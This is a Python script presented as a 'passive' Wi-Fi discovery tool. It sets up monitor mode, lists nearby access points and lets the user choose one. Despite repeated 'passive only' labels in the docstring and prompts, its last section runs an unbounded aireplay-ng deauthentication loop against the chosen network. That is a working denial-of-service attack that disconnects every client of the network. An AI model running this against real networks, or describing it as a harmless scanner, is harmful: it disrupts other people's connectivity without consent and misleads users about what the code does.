#!/usr/bin/env python3
"""
Passive Wi-Fi discovery (fixed SIGINT behavior)

- PASSIVE only: uses airodump-ng for CSV output.
- Press Ctrl+C while scanning -> stops live scanning and proceeds to AP selection.
- English comments and user-facing strings.
"""

import subprocess
import re
import csv
import os
import time
import sys
from datetime import datetime
from pathlib import Path

# ---------- Configuration ----------
AIRODUMP_PREFIX = "scanfile"
AIRODUMP_INTERVAL = 1.0
BACKUP_DIR = "backup_csvs"
# -----------------------------------

# Globals (used to coordinate between scanning and cleanup)
airodump_proc = None
monitor_iface = None
_stop_scanning = False  # flag set by KeyboardInterrupt handling

def ensure_root():
    if os.geteuid() != 0:
        print("This script requires root. Run with sudo or as root.")
        sys.exit(1)

def run_command(cmd):
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True)
        return proc.returncode, proc.stdout, proc.stderr
    except FileNotFoundError:
        return 127, "", f"Command not found: {cmd[0]}"

def detect_wireless_ifaces():
    ifaces = set()
    rc, out, err = run_command(["iw", "dev"])
    if rc == 0 and out:
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("Interface"):
                parts = line.split()
                if len(parts) >= 2:
                    ifaces.add(parts[1])
    if not ifaces:
        rc, out, err = run_command(["iwconfig"])
        if rc == 0 and out:
            for line in out.splitlines():
                tokens = line.split()
                if tokens:
                    cand = tokens[0]
                    if re.match(r'^(wlan[0-9]+|wl[a-z0-9]+|wlp[0-9s]+)', cand):
                        ifaces.add(cand)
    if not ifaces:
        rc, out, err = run_command(["ip", "link"])
        if rc == 0 and out:
            for line in out.splitlines():
                m = re.search(r'^\d+:\s*([^:]+):', line)
                if m:
                    name = m.group(1)
                    if name.startswith("wl"):
                        ifaces.add(name)
    return sorted(ifaces)

def backup_existing_csvs():
    p = Path(".")
    csv_files = list(p.glob("*.csv"))
    if not csv_files:
        return
    Path(BACKUP_DIR).mkdir(exist_ok=True)
    for f in csv_files:
        ts = datetime.now().strftime("%Y%m%d-%H%M%S")
        dest = Path(BACKUP_DIR) / f"{ts}-{f.name}"
        try:
            f.rename(dest)
        except Exception:
            try:
                f.replace(dest)
            except Exception:
                pass

def start_airodump(monitor_iface_local):
    cmd = ["sudo", "airodump-ng", "-w", AIRODUMP_PREFIX, "--write-interval", "1", "--output-format", "csv", monitor_iface_local]
    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def find_latest_airodump_csv():
    files = sorted(Path(".").glob(f"{AIRODUMP_PREFIX}-*.csv"), key=lambda p: p.stat().st_mtime, reverse=True)
    return files[0] if files else None

def parse_airodump_csv_for_aps(csv_path):
    if not csv_path or not csv_path.exists():
        return []
    aps = []
    with open(csv_path, "r", errors="ignore") as fh:
        reader = csv.reader(fh)
        for row in reader:
            if not row:
                continue
            if row[0].strip() == "Station MAC":
                break
            if row[0].strip() == "BSSID":
                continue
            bssid = row[0].strip() if len(row) > 0 else ""
            channel = row[3].strip() if len(row) > 3 else ""
            power = row[8].strip() if len(row) > 8 else ""
            essid = row[13].strip() if len(row) > 13 else ""
            if bssid and essid:
                aps.append({"BSSID": bssid, "channel": channel, "power": power, "ESSID": essid})
    seen = set()
    unique = []
    for a in aps:
        key = (a["BSSID"], a["ESSID"])
        if key not in seen:
            seen.add(key)
            unique.append(a)
    return unique

def stop_airodump(proc):
    try:
        proc.terminate()
        proc.wait(timeout=3)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass

def start_monitor_mode(iface):
    rc, out, err = run_command(["sudo", "airmon-ng", "start", iface])
    time.sleep(1)
    current = detect_wireless_ifaces()
    for name in current:
        if name.endswith("mon") or "mon" in name:
            return name
    return current[0] if current else iface

def stop_monitor_mode(m_iface):
    rc, out, err = run_command(["sudo", "airmon-ng", "stop", m_iface])
    return rc == 0

# --------------- Main ---------------
ensure_root()
backup_existing_csvs()

interfaces = detect_wireless_ifaces()
if not interfaces:
    print("No wireless interfaces detected. Make sure adapter is connected and drivers are loaded.")
    sys.exit(1)

print("Detected wireless interfaces:")
for i, nm in enumerate(interfaces):
    print(f"{i}: {nm}")

while True:
    choice = input("Select interface index for passive scanning: ").strip()
    if not choice.isdigit():
        print("Enter a number.")
        continue
    idx = int(choice)
    if 0 <= idx < len(interfaces):
        chosen_iface = interfaces[idx]
        break
    print("Index out of range.")

print(f"Selected: {chosen_iface}")
print("Enabling monitor mode (airmon-ng may create a new interface)...")
monitor_iface = start_monitor_mode(chosen_iface)
print(f"Monitor interface: {monitor_iface}")

print("Starting airodump-ng (passive capture). Press Ctrl+C to stop scanning and choose an AP.")
airodump_proc = start_airodump(monitor_iface)

# ----- improved Ctrl+C behavior: catch KeyboardInterrupt in loop, don't exit immediately -----
active_aps = []
try:
    while True:
        latest_csv = find_latest_airodump_csv()
        if latest_csv:
            active_aps = parse_airodump_csv_for_aps(latest_csv)
        os.system("clear" if os.name == "posix" else "cls")
        print("Passive Wi-Fi scan (display only). Press Ctrl+C to stop and select an AP.\n")
        print("No | BSSID              | Channel | Power | ESSID")
        print("---|--------------------|---------|-------|--------------------------")
        for i, ap in enumerate(active_aps):
            print(f"{i:2d} | {ap['BSSID']:18} | {ap['channel']:7} | {ap['power']:5} | {ap['ESSID']}")
        time.sleep(AIRODUMP_INTERVAL)
except KeyboardInterrupt:
    # Instead of calling sys.exit here, we simply break out of scanning loop and
    # proceed to selection & cleanup. This preserves the ability to select an AP.
    print("\nScan stopped by user (Ctrl+C). Proceeding to AP selection...")

# stop airodump process now that scanning is done
if airodump_proc:
    stop_airodump(airodump_proc)

if not active_aps:
    print("No APs captured. Cleaning up monitor mode and exiting.")
    if monitor_iface:
        stop_monitor_mode(monitor_iface)
    sys.exit(0)

# Present AP selection (passive-only)
print("\nDetected APs:")
for i, ap in enumerate(active_aps):
    print(f"{i}: {ap['ESSID']} ({ap['BSSID']}) channel {ap['channel']} power {ap['power']}")

while True:
    sel = input("Choose AP index to inspect (or 'q' to quit): ").strip()
    if sel.lower() == 'q':
        print("Exiting.")
        if monitor_iface:
            stop_monitor_mode(monitor_iface)
        sys.exit(0)
    if not sel.isdigit():
        print("Enter a number or 'q'.")
        continue
    si = int(sel)
    if 0 <= si < len(active_aps):
        chosen = active_aps[si]
        print("\nAP details (passive observation only):")
        print(f"ESSID : {chosen['ESSID']}")
        print(f"BSSID : {chosen['BSSID']}")
        print(f"Channel : {chosen['channel']}")
        print(f"Power : {chosen['power']}")
        input("\nPress Enter to exit and start Attack...")
        
        # Verify monitor interface is still active
        current_ifaces = detect_wireless_ifaces()
        if monitor_iface not in current_ifaces:
            print(f"Monitor interface {monitor_iface} is no longer active. Re-enabling monitor mode...")
            monitor_iface = start_monitor_mode(chosen_iface if 'chosen_iface' in locals() else monitor_iface.replace("mon", ""))
            print(f"Monitor interface: {monitor_iface}")
        
        print(f"Starting deauth attack on {chosen['ESSID']} ({chosen['BSSID']})...")
        print(f"Switching to channel {chosen['channel']}...")
        subprocess.run(["iwconfig", monitor_iface, "channel", chosen['channel']], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Press Ctrl+C to stop the attack.")
        try:
            while True:
                subprocess.run(["aireplay-ng", "--deauth", "0", "-a", chosen['BSSID'], monitor_iface])
        except KeyboardInterrupt:
            print("\nAttack stopped by user.")
        finally:
            if monitor_iface:
                print("Cleaning up monitor mode...")
                stop_monitor_mode(monitor_iface)
        sys.exit(0)

    else:
        print("Index out of range.")
